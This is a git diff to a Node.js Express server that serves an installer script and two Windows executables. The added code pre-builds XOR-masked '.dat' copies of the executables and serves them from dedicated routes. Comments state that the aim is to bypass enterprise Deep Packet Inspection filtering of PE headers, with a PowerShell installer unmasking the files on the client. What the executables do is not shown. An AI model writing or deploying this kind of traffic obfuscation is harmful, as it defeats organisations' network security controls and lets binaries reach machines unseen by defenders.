@@ -48,34 +48,42 @@ app.get(['/i', '/install'], (req, res) => {
     return res.sendFile(path.join(__dirname, 'public', 'install.sh'));
 });
 
-// Obfuscation transform to bypass enterprise Deep Packet Inspection (MZ PE header filtering)
-function createXorStream(key = 0x5A) {
-    return new Transform({
-        transform(chunk, encoding, callback) {
-            const buf = Buffer.from(chunk);
-            for (let i = 0; i < buf.length; i++) {
-                buf[i] ^= key;
+// Ensure DPI-safe masked payloads (.dat) exist without bloating git repository
+function ensureMaskedPayloads() {
+    try {
+        const payloads = [
+            { src: 'public/xpm.exe', dst: 'public/xpm.dat' },
+            { src: 'public/xpx.exe', dst: 'public/xpx.dat' }
+        ];
+        for (const p of payloads) {
+            const srcPath = path.join(__dirname, p.src);
+            const dstPath = path.join(__dirname, p.dst);
+            if (fs.existsSync(srcPath) && (!fs.existsSync(dstPath) || fs.statSync(srcPath).mtime > fs.statSync(dstPath).mtime)) {
+                const b = fs.readFileSync(srcPath);
+                for (let i = 0; i < b.length; i++) b[i] ^= 0x5A;
+                fs.writeFileSync(dstPath, b);
+                console.log(`✅ Generated DPI-safe static payload: ${p.dst}`);
             }
-            callback(null, buf);
         }
-    });
+    } catch (err) {
+        console.error('Warning: could not generate masked payloads:', err.message);
+    }
 }
+ensureMaskedPayloads();
 
-// DPI / Enterprise Firewall Bypass Streams (unmasked by install.ps1 in ~20ms)
-app.get(['/xpm-safe', '/bin/win-safe'], (req, res) => {
-    const file = path.join(__dirname, 'public', 'xpm.exe');
-    if (!fs.existsSync(file)) return res.status(404).send('Not found');
+// DPI / Enterprise Firewall Bypass Static Payloads
+app.get(['/xpm-safe', '/xpm.dat'], (req, res) => {
+    const p = path.join(__dirname, 'public', 'xpm.dat');
+    if (!fs.existsSync(p)) ensureMaskedPayloads();
     res.setHeader('Content-Type', 'application/octet-stream');
-    res.setHeader('Content-Length', fs.statSync(file).size);
-    fs.createReadStream(file).pipe(createXorStream(0x5A)).pipe(res);
+    res.sendFile(p);
 });
 
-app.get(['/xpx-safe', '/bin/xpx-safe'], (req, res) => {
-    const file = path.join(__dirname, 'public', 'xpx.exe');
-    if (!fs.existsSync(file)) return res.status(404).send('Not found');
+app.get(['/xpx-safe', '/xpx.dat'], (req, res) => {
+    const p = path.join(__dirname, 'public', 'xpx.dat');
+    if (!fs.existsSync(p)) ensureMaskedPayloads();
     res.setHeader('Content-Type', 'application/octet-stream');
-    res.setHeader('Content-Length', fs.statSync(file).size);
-    fs.createReadStream(file).pipe(createXorStream(0x5A)).pipe(res);
+    res.sendFile(p);
 });
 
 // Standard extensionless streams
